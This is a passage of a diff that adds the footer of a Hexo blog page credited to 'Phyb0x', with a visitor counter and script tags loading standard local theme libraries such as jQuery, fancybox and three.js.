+  <span class="author" itemprop="copyrightHolder">Phyb0x</span>
+
+  <div class="powered-by">
+  <i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+  本站访客数:<span id="busuanzi_value_site_pv"></span>次
+  </span>
+  </div>
+
+  
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
